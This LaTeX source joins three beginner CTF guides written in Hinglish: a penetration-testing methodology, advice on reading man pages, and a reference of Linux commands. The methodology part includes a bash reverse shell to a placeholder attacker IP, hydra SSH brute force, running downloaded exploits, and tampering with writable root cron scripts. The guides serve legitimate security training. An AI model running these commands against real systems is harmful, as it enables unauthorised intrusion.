\documentclass[a4paper]{article}

% Page setup: A4 paper with 2cm margins
\usepackage[a4paper, margin=2cm]{geometry}

% Colors package for custom colors
\usepackage{xcolor}
\definecolor{headingblue}{RGB}{0, 102, 204}      % Blue for headings
\definecolor{examplegreen}{RGB}{0, 153, 76}      % Green for examples
\definecolor{warningred}{RGB}{204, 0, 0}         % Red for warnings
\definecolor{codebg}{RGB}{173, 216, 230}         % Light blue for code background
\definecolor{tablerow}{RGB}{144, 238, 144}       % Light green for table rows
\definecolor{yellowheader}{RGB}{255, 204, 0}     % Yellow for third table column header

% Headings customization
\usepackage{titlesec}
\titleformat{\section}{\Large\bfseries\color{headingblue}}{\thesection}{1em}{}
\titleformat{\subsection}{\large\bfseries\color{headingblue}}{\thesubsection}{1em}{}

% Listings package for code blocks
\usepackage{listings}
\lstset{
  language=bash,                  % Syntax highlighting for bash
  backgroundcolor=\color{codebg}, % Light blue background
  basicstyle=\ttfamily\small,     % Monospace font, small size
  frame=single,                   % Framed border
  breaklines=true,                % Wrap long lines
  keywordstyle=\color{blue},      % Keywords in blue
  commentstyle=\color{gray},      % Comments in gray
  stringstyle=\color{purple}      % Strings in purple
}

% Tables: array and colortbl for formatting
\usepackage{array, colortbl}
\newcolumntype{C}[1]{>{\centering\arraybackslash}p{#1}} % Centered column with width

% Example boxes with tcolorbox
\usepackage[many]{tcolorbox}
\newtcolorbox{examplebox}{
  colback=examplegreen!10,       % Light green background
  colframe=examplegreen,         % Green frame
  title=Example,                 % Default title
  fonttitle=\bfseries\color{examplegreen}, % Green title text
  boxrule=1pt,                   % Frame thickness
  sharp corners                  % Sharp edges
}

% Begin document
\begin{document}

% Title Page
\begin{titlepage}
  \centering
  {\Huge\bfseries\color{headingblue} CTF Solve Karne ka Step-by-Step Guide (Hinglish Mein)\par}
  \vspace{2cm}
  {\Large Author: Your Name\par}
  \vspace{1cm}
  {\large Date: March 01, 2025\par}
\end{titlepage}

% Introduction (as a brief purpose statement)
\section{Introduction}
\textbf{CTF Solve Karne ka Step-by-Step Guide (Hinglish Mein):} \\
This guide will walk you through solving Capture The Flag (CTF) challenges with a step-by-step approach, explained in Hinglish for better understanding.

% Step 1: Organize Karo
\section{Step 1: Organize Karo (Folder Structure)}
\textbf{Kyun Important Hai?} \\
Har CTF ke liye ek alag folder banake sab kuch organize rakho. Isse confusion nahi hoti aur documentation bhi acchi rehti hai. \\

\textbf{Folder Structure Example:} \\
\begin{lstlisting}
CTF_Folder/  
├── nmap_scan.txt          # Nmap scan results  
├── dirbuster_results.txt  # Directory brute-force results  
├── usernames.txt          # Mil gaye usernames  
├── passwords.txt          # Mil gaye passwords  
├── exploits/              # Exploits save karne ke liye  
└── notes.txt              # Important points/documentation  
\end{lstlisting}

\textbf{Kaise Banaye?} \\
\begin{lstlisting}
mkdir CTF_Folder  
cd CTF_Folder  
touch nmap_scan.txt dirbuster_results.txt usernames.txt passwords.txt notes.txt  
mkdir exploits  
\end{lstlisting}

% Step 2: Reconnaissance
\section{Step 2: Reconnaissance (Information Gathering)}
\subsection{1. Nmap Scan Karo:}
\textbf{Kyun?} Open ports aur services pata karne ke liye. \\
\textbf{Command:} \\
\begin{lstlisting}
nmap -sV -sC -oN nmap_scan.txt <target_ip>  
\end{lstlisting}
\begin{itemize}
  \item \texttt{-sV}: Service versions detect karega.
  \item \texttt{-sC}: Default scripts run karega.
  \item \texttt{-oN}: Output file mein save karega.
\end{itemize}

\subsection{2. Nikle Hue Services ke Hisab se Aage Badho:}
\begin{itemize}
  \item \textbf{Web Service (Port 80/443):}
    \begin{itemize}
      \item \textbf{Dirbuster ya Gobuster se Directory Brute-force Karo:} \\
        \begin{lstlisting}
        gobuster dir -u http://<target_ip> -w /path/to/wordlist.txt -o dirbuster_results.txt  
        \end{lstlisting}
        Common wordlists: \texttt{/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}.
      \item \textbf{Nikle Hue Directories ko Browser ya `curl` se Check Karo:} \\
        \begin{lstlisting}
        curl http://<target_ip>/hidden_directory  
        \end{lstlisting}
    \end{itemize}
  \item \textbf{SSH Service (Port 22):}
    \begin{itemize}
      \item \textbf{Brute-force Karne ke Liye `hydra` Use Karo:} \\
        \begin{lstlisting}
        hydra -l admin -P /path/to/rockyou.txt ssh://<target_ip>  
        \end{lstlisting}
        \begin{itemize}
          \item \texttt{-l}: Username try karega.
          \item \texttt{-P}: Password list use karega.
        \end{itemize}
    \end{itemize}
  \item \textbf{FTP Service (Port 21):}
    \begin{itemize}
      \item \textbf{Anonymous Login Check Karo:} \\
        \begin{lstlisting}
        ftp <target_ip>  
        Username: anonymous  
        Password: (kuch bhi daalo)  
        \end{lstlisting}
      \item \textbf{Mil Gaye Files ko Download Karo:} \\
        \begin{lstlisting}
        get file.txt  
        \end{lstlisting}
    \end{itemize}
  \item \textbf{SMB Service (Port 445):}
    \begin{itemize}
      \item \textbf{Enumeration ke Liye `smbclient` Use Karo:} \\
        \begin{lstlisting}
        smbclient -L //<target_ip>  
        \end{lstlisting}
      \item \textbf{Share Access Karo:} \\
        \begin{lstlisting}
        smbclient //<target_ip>/share_name  
        \end{lstlisting}
    \end{itemize}
\end{itemize}

% Step 3: Vulnerability Hunting
\section{Step 3: Vulnerability Hunting}
\begin{enumerate}
  \item \textbf{Searchsploit Use Karo:} \\
    \textbf{Kyun?} Known vulnerabilities dhoondhne ke liye. \\
    \textbf{Command:} \\
    \begin{lstlisting}
    searchsploit <service_name>  
    \end{lstlisting}
    Example: \texttt{searchsploit Apache 2.4.29}.
  \item \textbf{Nikle Hue Exploits ko Download Karo:} \\
    \begin{lstlisting}
    searchsploit -m <exploit_id>  
    \end{lstlisting}
    Example: \texttt{searchsploit -m 45010}.
  \item \textbf{Exploit-DB ya Google se Bhi Search Karo:} \\
    Example: "Apache 2.4.29 exploit".
\end{enumerate}

% Step 4: Exploitation
\section{Step 4: Exploitation}
\begin{enumerate}
  \item \textbf{Mil Gaye Exploits ko Run Karo:} \\
    \textbf{Python Exploits:} \\
    \begin{lstlisting}
    python3 exploit.py <target_ip>  
    \end{lstlisting}
    \textbf{Compile Karne Wale Exploits:} \\
    \begin{lstlisting}
    gcc exploit.c -o exploit  
    ./exploit  
    \end{lstlisting}
  \item \textbf{Reverse Shell Lena:} \\
    \textbf{Netcat Use Karo:} \\
    \begin{itemize}
      \item Attacker Machine: \\
        \begin{lstlisting}
        nc -lvnp 4444  
        \end{lstlisting}
      \item Target Machine: \\
        \begin{lstlisting}
        bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'  
        \end{lstlisting}
    \end{itemize}
\end{enumerate}

% Step 5: Post-Exploitation
\section{Step 5: Post-Exploitation}
\begin{enumerate}
  \item \textbf{User Flag Dhoondho:} \\
    Common Locations: \\
    \begin{lstlisting}
    /home/<user>/user.txt  
    /var/www/html/flag.txt  
    \end{lstlisting}
  \item \textbf{Privilege Escalation Karo:} \\
    \begin{itemize}
      \item \textbf{SUID Binaries Check Karo:} \\
        \begin{lstlisting}
        find / -perm -u=s -o -perm -g=s 2>/dev/null  
        \end{lstlisting}
      \item \textbf{Cron Jobs Check Karo:} \\
        \begin{lstlisting}
        crontab -l  
        \end{lstlisting}
      \item \textbf{Kernel Version Check Karo:} \\
        \begin{lstlisting}
        uname -a  
        \end{lstlisting}
    \end{itemize}
\end{enumerate}

% Step 6: Documentation
\section{Step 6: Documentation}
\begin{enumerate}
  \item \textbf{Sab Kuch Notes Mein Save Karo:} \\
    \textbf{Example Notes:} \\
    \begin{lstlisting}
    Target IP: 192.168.1.100  
    Open Ports: 22 (SSH), 80 (HTTP)  
    Usernames: admin, root  
    Passwords: admin123, password  
    Exploits Used: searchsploit 45010  
    Flags Found: /home/user/user.txt, /root/root.txt  
    \end{lstlisting}
  \item \textbf{Screenshots Lena:} \\
    Important steps (e.g., flags, exploitation) ka screenshot lo.
\end{enumerate}

% Additional Tools for CTF
\section{Additional Tools for CTF}
\begin{enumerate}
  \item \textbf{Searchsploit:} \\
    Known exploits dhoondhne ke liye.
  \item \textbf{CyberChef:} \\
    \textbf{Kya Karta Hai?} Data encoding/decoding, encryption, compression, etc. ke liye. \\
    \textbf{Kab Use Kare?} \\
    \begin{itemize}
      \item Base64 decode karne ke liye.
      \item Hex se ASCII convert karne ke liye.
      \item XOR decryption karne ke liye.
    \end{itemize}
    \textbf{Example:} \\
    CyberChef mein \texttt{ZmxhZw==} daalo aur "From Base64" recipe lagao. Output: \texttt{flag}.
  \item \textbf{Burp Suite:} \\
    Web application testing ke liye (e.g., SQL injection, XSS).
  \item \textbf{Metasploit:} \\
    Exploitation framework (pre-built exploits aur payloads).
  \item \textbf{Ghidra:} \\
    Binary reverse engineering ke liye.
  \item \textbf{Wfuzz:} \\
    Web fuzzing ke liye (hidden parameters, directories dhoondhna).
\end{enumerate}

% CyberChef ka Detailed Explanation
\section{CyberChef ka Detailed Explanation}
\textbf{Kya Hai?} \\
Ek web-based tool jo data manipulation ke liye use hota hai. \\

\textbf{Common Use Cases:} \\
\begin{enumerate}
  \item \textbf{Base64 Decode:} \\
    Input: \texttt{ZmxhZw==} \\
    Recipe: "From Base64" \\
    Output: \texttt{flag}
  \item \textbf{Hex to ASCII:} \\
    Input: \texttt{66 6c 61 67} \\
    Recipe: "From Hex" \\
    Output: \texttt{flag}
  \item \textbf{XOR Decryption:} \\
    Input: \texttt{1c 01 0b 1d} \\
    Recipe: "XOR" (key: \texttt{A}) \\
    Output: \texttt{flag}
\end{enumerate}

\textbf{Kaise Use Kare?} \\
Website: \texttt{https://gchq.github.io/CyberChef/} \\
Left pane mein input daalo aur right pane mein recipes add karo.

% Exploits Folder aur Notes.txt File
\section{Exploits Folder aur Notes.txt File: Kya Rakhe?}
\subsection{Exploits Folder:}
\textbf{Kya Rakhe?} \\
Jo bhi exploits milte hain (e.g., Python scripts, C code, pre-compiled binaries), unhe is folder mein save karo. \\
\textbf{Example:} \\
\begin{itemize}
  \item \texttt{exploit.py}
  \item \texttt{exploit.c}
  \item \texttt{45010.c} (Searchsploit se download kiya hua exploit).
\end{itemize}

\textbf{Kaise Save Kare?} \\
\begin{lstlisting}
mkdir exploits  
cd exploits  
searchsploit -m 45010  # Exploit ko download karke exploits folder mein save karega
\end{lstlisting}

\subsection{Notes.txt File:}
\textbf{Kya Rakhe?} \\
Har step ka summary aur important findings. \\
\textbf{Example:} \\
\begin{lstlisting}
Target IP: 192.168.1.100  
Open Ports: 22 (SSH), 80 (HTTP)  
Usernames: admin, root  
Passwords: admin123, password  
Exploits Used: searchsploit 45010  
Flags Found: /home/user/user.txt, /root/root.txt  
\end{lstlisting}

% Searchsploit Tool
\section{Searchsploit Tool: Kab aur Kaise Use Kare?}
\subsection{Kya Hai?}
Ek command-line tool jo Exploit-DB (Exploit Database) se known vulnerabilities aur exploits dhoondhta hai.

\subsection{Kab Use Kare?}
Jab aapko kisi service ya software ka version pata ho aur usme koi vulnerability ho sakti ho.

\subsection{Kaise Use Kare?}
\begin{enumerate}
  \item \textbf{Service/Software ke Naam se Search Karo:} \\
    \begin{lstlisting}
    searchsploit Apache 2.4.29  
    \end{lstlisting}
    Output: \\
    \begin{lstlisting}
    Exploits: No Result  
    Shellcodes: No Result  
    \end{lstlisting}
    Agar kuch mila toh exploit ID aur description dikhayega.
  \item \textbf{Exploit Download Karo:} \\
    \begin{lstlisting}
    searchsploit -m 45010  # Exploit ko download karega
    \end{lstlisting}
    Download hua exploit \texttt{45010.c} ya \texttt{45010.py} ke format mein save hoga.
  \item \textbf{Exploit Compile ya Run Karo:} \\
    \textbf{C Exploit Compile Karne ke Liye:} \\
    \begin{lstlisting}
    gcc 45010.c -o exploit  # Compile karega
    ./exploit  # Run karega
    \end{lstlisting}
    \textbf{Python Exploit Run Karne ke Liye:} \\
    \begin{lstlisting}
    python3 45010.py  
    \end{lstlisting}
\end{enumerate}

% Privilege Escalation
\section{Privilege Escalation: SUID, Cron Jobs, aur Kernel Version Check}
\subsection{SUID Binaries Check:}
\textbf{Kya Hai?} \\
SUID (Set User ID) binaries wo programs hote hain jo root user ke permissions ke saath run hote hain, chahe unhe normal user hi kyun na run kare. \\
Agar koi SUID binary vulnerable hai, toh usse privilege escalation ho sakta hai. \\

\textbf{Kaise Check Kare?} \\
\begin{lstlisting}
find / -perm -u=s -o -perm -g=s 2>/dev/null  
\end{lstlisting}
\begin{itemize}
  \item \texttt{-perm -u=s}: SUID binaries dhoondhega.
  \item \texttt{2>/dev/null}: Errors hide karega.
\end{itemize}

\textbf{Example:} \\
Output: \\
\begin{lstlisting}
/usr/bin/find  
/usr/bin/bash  
\end{lstlisting}
Agar \texttt{find} ya \texttt{bash} SUID set hai, toh exploit kar sakte ho.

\subsection{Cron Jobs Check:}
\textbf{Kya Hai?} \\
Cron jobs wo tasks hote hain jo regularly run hote hain (e.g., har minute, har din). \\
Agar koi cron job root permissions ke saath run ho raha hai aur usme vulnerability hai, toh usse privilege escalation ho sakta hai. \\

\textbf{Kaise Check Kare?} \\
\begin{lstlisting}
crontab -l  # Current user ke cron jobs dikhayega
\end{lstlisting}
\textbf{System-wide Cron Jobs Check Karne ke Liye:} \\
\begin{lstlisting}
ls /etc/cron*  # System cron jobs dikhayega
\end{lstlisting}

\textbf{Example:} \\
Output: \\
\begin{lstlisting}
* * * * * root /opt/scripts/backup.sh  
\end{lstlisting}
Agar \texttt{backup.sh} writable hai, toh usme malicious code add kar sakte ho.

\subsection{Kernel Version Check:}
\textbf{Kya Hai?} \\
Kernel version check karne se pata chalega ki system vulnerable hai ya nahi. \\
Agar kernel version purana hai, toh uske liye known exploits available hote hain. \\

\textbf{Kaise Check Kare?} \\
\begin{lstlisting}
uname -a  # Kernel version dikhayega
\end{lstlisting}
Output: \\
\begin{lstlisting}
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux  
\end{lstlisting}

\textbf{Exploit Dhoondhne ke Liye:} \\
\begin{lstlisting}
searchsploit Linux Kernel 5.10.0  
\end{lstlisting}

% Final Tips (as Summary)
\section{Final Tips}
\textbf{Final Tips:} \\
\begin{itemize}
  \item \textcolor{warningred}{Practice:} TryHackMe, Hack The Box, ya OverTheWire par practice karo.
  \item \textcolor{warningred}{Documentation:} Har step ko notes mein save karo.
  \item \textcolor{warningred}{Tools:} Har tool ko samajh kar use karo (e.g., CyberChef, Burp Suite).
\end{itemize}
Agar aur kuch samajh nahi aaya ho, toh pooch sakte ho! ��

% Example Table
\section{Example Table}
\begin{table}[h]
  \centering
  \begin{tabular}{|C{4cm}|C{4cm}|C{4cm}|}
    \hline
    \rowcolor{headingblue} \color{white} \textbf{Step} & 
    \rowcolor{examplegreen} \color{white} \textbf{Tool} & 
    \rowcolor{yellowheader} \color{black} \textbf{Purpose} \\
    \hline
    Reconnaissance & Nmap & Ports Scan Karna \\
    \hline
    \rowcolor{tablerow} Exploitation & Metasploit & Exploit Chalana \\
    \hline
    Documentation & Notes.txt & Findings Save Karna \\
    \hline
  \end{tabular}
  \caption{CTF Tools and Their Uses}
\end{table}

===============================
\hrule




% Define colors
\definecolor{important}{rgb}{1, 0, 0} % Red for important points
\definecolor{example}{rgb}{0, 0.5, 0} % Green for examples
\definecolor{code}{rgb}{0, 0, 0.8} % Blue for code
\definecolor{lightgray}{rgb}{0.9, 0.9, 0.9} % Light gray for code blocks

\begin{document}

\title{\textcolor{important}{Linux Commands: `man` aur `--help` ka Sahi Istemal and with the  help of man and --help kisi v command ko use karne ka...}}
\author{}
\date{}
\maketitle

\section*{\textcolor{important}{Bilkul bhai, samajh gaya tujhe kya problem ho rahi hai}}
Tu naya hai Linux mein aur CTF khelte waqt naye commands kaise use karein, yeh samajhna chahta hai. Main tujhe step-by-step samjhata hoon ki `man` aur `--help` ka use kaise karein aur kaise inhe dekh kar command ka use karein. Hinglish mein explain karta hoon, aur examples bhi dunga taki tu aasani se samajh sake.

---

\section*{\textcolor{important}{1️⃣ `man` aur `--help` ka Basic Difference}}
\begin{itemize}
    \item \textcolor{important}{\textbf{`man` (Manual):}}  
    Yeh ek detailed documentation hai. Har command ke baare mein puri jankari deta hai. Jaise ki command ka syntax, options, examples, aur bhi bahut kuch.  
    \textcolor{example}{Example:} \texttt{\textcolor{code}{man ssh}} likhne se SSH command ka puri detail mein explanation milta hai.

    \item \textcolor{important}{\textbf{`--help`:}}  
    Yeh quick help hai. Basic usage aur important options dikhata hai. Jaldi mein syntax aur flags dekhne ke liye use karo.  
    \textcolor{example}{Example:} \texttt{\textcolor{code}{ssh --help}} likhne se SSH ke basic options aur syntax dikhenge.
\end{itemize}

---

\section*{\textcolor{important}{2️⃣ Jab bhi naya command mile, yeh steps follow karo:}}

\subsection*{\textcolor{important}{Step 1: Pehle `--help` dekho}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kyun?}}  
    `--help` se tujhe command ka basic syntax aur common options pata chal jayenge. Yeh quick reference hai.
    
    \item \textcolor{important}{\textbf{Kaise use karein?}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
<command> --help
    \end{lstlisting}
    \textcolor{example}{Example:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ssh --help
    \end{lstlisting}
    \textcolor{important}{Output:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]
           [-D [bind_address:]port] [-E log_file] [-e escape_char]
           [-F configfile] [-I pkcs11] [-i identity_file]
           [-J [user@]host[:port]] [-L address] [-l login_name]
           [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option]
           [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]
           [user@]hostname [command]
    \end{lstlisting}
    Isme tujhe pata chalega ki SSH ka basic syntax kya hai aur kaunse options use kar sakte ho.

    \item \textcolor{important}{\textbf{Example:}}  
    Maano tujhe SSH se connect karna hai aur tujhe pata nahi kaise karna hai. `ssh --help` se tujhe pata chalega ki basic syntax kuch aisa hai:
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ssh [options] [user@]hostname [command]
    \end{lstlisting}
    Matlab, tujhe ek hostname aur username chahiye hoga. \textcolor{example}{Example:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ssh user@192.168.1.100
    \end{lstlisting}
    Agar tujhe specific port use karna hai, toh `-p` flag use karna hai:
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ssh -p 2222 user@192.168.1.100
    \end{lstlisting}
\end{itemize}

---

\subsection*{\textcolor{important}{Step 2: Agar `--help` se samajh nahi aaya, toh `man` use karo}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kyun?}}  
    `man` mein har option ka detailed explanation hota hai. Agar tujhe kisi specific flag ya option ka kaam samajhna hai, toh `man` use karo.

    \item \textcolor{important}{\textbf{Kaise use karein?}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
man <command>
    \end{lstlisting}
    \textcolor{example}{Example:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
man ssh
    \end{lstlisting}
    Isme tujhe SSH command ke baare mein puri jankari milegi.

    \item \textcolor{important}{\textbf{Example:}}  
    Maano tujhe `-p` flag ka kaam samajhna hai. `man ssh` mein search karo:
    \begin{enumerate}
        \item \texttt{\textcolor{code}{man ssh}} likho aur enter dabao.
        \item \texttt{\textcolor{code}{/}} type karo aur \texttt{\textcolor{code}{-p}} likh kar enter dabao. Yeh `-p` flag search karega.
        \item Tujhe mil jayega:
        \begin{lstlisting}[backgroundcolor=\color{lightgray}]
-p port
    Port to connect to on the remote host. This can be specified on a
    per-host basis in the configuration file.
        \end{lstlisting}
        Matlab, `-p` flag se tujhe remote machine ke specific port par connect kar sakte ho. \textcolor{example}{Example:}
        \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ssh -p 2222 user@192.168.1.100
        \end{lstlisting}
    \end{enumerate}
\end{itemize}

---

\subsection*{\textcolor{important}{Step 3: Practice karo}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Kyun?}}  
    Jab bhi naya command seekho, usko terminal mein try karo. Practice se hi confidence aayega.

    \item \textcolor{important}{\textbf{Example:}}  
    Maano tujhe `ssh` command ka use karna hai. Steps:
    \begin{enumerate}
        \item Pehle \texttt{\textcolor{code}{ssh --help}} se basic syntax dekho.
        \item Fir \texttt{\textcolor{code}{man ssh}} se detailed options samjho.
        \item Ab terminal mein try karo:
        \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ssh -v -p 2222 user@192.168.1.100
        \end{lstlisting}
        Isme:
        \begin{itemize}
            \item \texttt{\textcolor{code}{-v}}: Verbose mode (detailed output dikhane ke liye).
            \item \texttt{\textcolor{code}{-p 2222}}: Port 2222 use karne ke liye.
            \item \texttt{\textcolor{code}{user@192.168.1.100}}: Remote machine ka username aur IP address.
        \end{itemize}
    \end{enumerate}
\end{itemize}

---

\section*{\textcolor{important}{3️⃣ CTF ke liye Important Tips}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Naye commands kaise seekhein?}}
    \begin{enumerate}
        \item \textcolor{important}{Pehle `--help` dekho:} Basic syntax aur common options samajh lo.
        \item \textcolor{important}{Agar detail chahiye, toh `man` use karo:} Har option ka deep explanation milega.
        \item \textcolor{important}{Grep use karo:} Agar sirf ek specific flag ka kaam samajhna hai, toh `man` mein search karo. \textcolor{example}{Example:}
        \begin{lstlisting}[backgroundcolor=\color{lightgray}]
man ssh | grep "\-p"
        \end{lstlisting}
        Isse sirf `-p` flag ka explanation milega.
        \item \textcolor{important}{Practice karo:} Har command ko terminal mein try karo. \textcolor{example}{Example:}
        \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ssh -v -p 2222 user@192.168.1.100
        \end{lstlisting}
    \end{enumerate}
\end{itemize}

---

\section*{\textcolor{important}{4️⃣ Example: Ek aur command (ls)}}
Maano tujhe `ls` command ka use karna hai:
\begin{enumerate}
    \item \textcolor{important}{Pehle `--help` dekho:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ls --help
    \end{lstlisting}
    \textcolor{important}{Output:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
Usage: ls [OPTION]... [FILE]...
List information about the FILEs (the current directory by default).
    \end{lstlisting}
    Matlab, `ls` se current directory ki files list hoti hain.

    \item \textcolor{important}{Agar detail chahiye, toh `man` use karo:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
man ls
    \end{lstlisting}
    Isme tujhe `ls` ke sabhi options ka detailed explanation milega.

    \item \textcolor{important}{Practice karo:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
ls -l
    \end{lstlisting}
    Isse detailed list milegi.
\end{enumerate}

---

\section*{\textcolor{important}{5️⃣ Conclusion}}
\begin{itemize}
    \item \textcolor{important}{\textbf{`--help`:}} Quick reference ke liye use karo. Basic syntax aur common options samajhne ke liye.
    \item \textcolor{important}{\textbf{`man`:}} Detailed documentation ke liye use karo. Har option ka deep explanation milega.
    \item \textcolor{important}{\textbf{Practice:}} Har command ko terminal mein try karo. Jitna zyada practice karoge, utna hi confident banoge.
\end{itemize}

Ab tu jab bhi naya command dekhe, pehle `--help` aur fir `man` use karna. Practice karte raho aur har command ko try karo. CTF mein bhi yeh approach follow karna. Tujhe koi bhi command ka use samajhne mein problem nahi hogi. ��

---

\section*{\textcolor{important}{Extra Example: `grep` Command}}
\begin{enumerate}
    \item \textcolor{important}{Pehle `--help` dekho:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
grep --help
    \end{lstlisting}
    \textcolor{important}{Output:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
Usage: grep [OPTION]... PATTERN [FILE]...
Search for PATTERN in each FILE.
    \end{lstlisting}
    Matlab, `grep` se tujhe kisi file mein specific text search kar sakte ho.

    \item \textcolor{important}{Agar detail chahiye, toh `man` use karo:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
man grep
    \end{lstlisting}
    Isme tujhe `grep` ke sabhi options ka detailed explanation milega.

    \item \textcolor{important}{Practice karo:}
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
grep "hello" file.txt
    \end{lstlisting}
    Isse `file.txt` mein "hello" word search hoga.
\end{enumerate}

---

\section*{\textcolor{important}{Bas bhai, ab tu confidently kisi bhi command ka use kar sakta hai. Happy CTFing! ��}}

===============================
\hrule



% Define colors
\definecolor{important}{rgb}{1, 0, 0} % Red for important points
\definecolor{example}{rgb}{0, 0.5, 0} % Green for examples
\definecolor{code}{rgb}{0, 0, 0.8} % Blue for code
\definecolor{lightgray}{rgb}{0.9, 0.9, 0.9} % Light gray for code blocks

\begin{document}



\section*{\textbf{\LARGE \textcolor{violet}{important}{Most Important Linux Commands Used in Solving CTF}}}


\author{}
\date{}
\maketitle

\section*{\textcolor{important}{Aapke Doubts Clear Karte Hain, Detailed Explanations aur Examples ke Saath}}

---

\section*{\textcolor{important}{1. \texttt{strings} Command}}
\subsection*{\textcolor{important}{Kya Karta Hai?}}
Kisi bhi file (binary, image, etc.) se readable text/strings extract karta hai. CTF mein hidden messages, passwords, ya flag dhoondhne ke kaam aata hai.  

\subsection*{\textcolor{important}{Important Flags aur Examples:}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Basic Use:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
strings filename  # File ke saare readable strings dikhata hai
    \end{lstlisting}  
    \item \textcolor{important}{\textbf{Minimum Length ke Strings Filter Karne ke Liye (\texttt{-n}):}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
strings -n 10 secret.jpg  # 10+ characters ki strings hi dikhayega
    \end{lstlisting}  
    \item \textcolor{important}{\textbf{CTF Example:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
strings malware.exe | grep "CTF{"  # Flag dhoondhne ke liye directly filter
    \end{lstlisting}  
\end{itemize}

\subsection*{\textcolor{important}{CTF Use Case:}}
\begin{itemize}
    \item Binary file (e.g., \texttt{.exe}, \texttt{.elf}) mein "CTF\{...\}" format ka flag chhupa ho sakta hai.  
    \item Image/file ke andar hidden text (e.g., \texttt{ZmxhZw==} base64) mil sakta hai.  
\end{itemize}

---

\section*{\textcolor{important}{2. \texttt{nc} / \texttt{netcat} Command}}
\subsection*{\textcolor{important}{Kya Karta Hai?}}
Network communication ke liye use hota hai. Jaise kisi server se connect karna, port scanning, ya data transfer.  

\subsection*{\textcolor{important}{Common Use Cases aur Examples:}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Server se Connect Hona:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
nc ctf.example.com 1337  # Port 1337 par connect hoga
    \end{lstlisting}  
    - Iske baad server se interaction kar sakte ho (e.g., math puzzles solve karna).  

    \item \textcolor{important}{\textbf{File Receive/Download Karne ke Liye:}}  
    - \textbf{Receiver Side (file save karega):}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
nc -lvnp 4444 > received_file
    \end{lstlisting}  
    - \textbf{Sender Side (file bhejega):}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
nc 192.168.1.5 4444 < send_file
    \end{lstlisting}  

    \item \textcolor{important}{\textbf{CTF Example:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
echo "GET /flag.txt" | nc ctf-server 80  # HTTP request bhej kar flag mangna
    \end{lstlisting}  
\end{itemize}

---

\section*{\textcolor{important}{3. \texttt{curl} Command}}
\subsection*{\textcolor{important}{Kya Karta Hai?}}
Web APIs, websites, ya servers se data fetch ya send karne ke liye use hota hai.  

\subsection*{\textcolor{important}{Important Flags aur Examples:}}
\begin{itemize}
    \item \textcolor{important}{\textbf{Simple GET Request:}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
curl http://ctf.com/secret.php  # Webpage ka HTML fetch karega
    \end{lstlisting}  
    \item \textcolor{important}{\textbf{POST Request Bhejna (\texttt{-X POST}, \texttt{-d}):}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
curl -X POST http://ctf.com/login.php -d "username=admin&password=1234"
    \end{lstlisting}  
    \item \textcolor{important}{\textbf{Headers Add Karna (\texttt{-H}):}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
curl -H "User-Agent: Hackerman" http://ctf.com/admin  # Fake user-agent bhejna
    \end{lstlisting}  
    \item \textcolor{important}{\textbf{File Download Karna (\texttt{-O}):}}  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
curl -O http://ctf.com/flag.zip  # flag.zip download karega
    \end{lstlisting}  
\end{itemize}

\subsection*{\textcolor{important}{CTF Use Case:}}
\begin{itemize}
    \item Hidden API endpoints ko test karna (e.g., \texttt{/flag}, \texttt{/admin}).  
    \item Cookies modify karke (using \texttt{-H "Cookie:..."}) auth bypass karna.  
\end{itemize}

---

\section*{\textcolor{important}{4. \texttt{unzip} vs \texttt{tar} (Extraction Commands)}}
\subsection*{\textcolor{important}{Kab Kaun Use Kare?}}
\begin{itemize}
    \item \textcolor{important}{\textbf{\texttt{unzip}:}} \texttt{.zip} files extract karne ke liye.  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
unzip file.zip  # ZIP extract
unzip -l file.zip  # ZIP ke contents list karega (extract nahi karega)
    \end{lstlisting}  

    \item \textcolor{important}{\textbf{\texttt{tar}:}} \texttt{.tar}, \texttt{.tar.gz}, \texttt{.tar.xz} files ke liye.  
    \begin{lstlisting}[backgroundcolor=\color{lightgray}]
tar -xf file.tar        # Simple TAR extract
tar -xzf file.tar.gz    # GZIP-compressed TAR extract (-z flag)
tar -xJf file.tar.xz    # XZ-compressed TAR extract (-J flag)
    \end{lstlisting}  
\end{itemize}

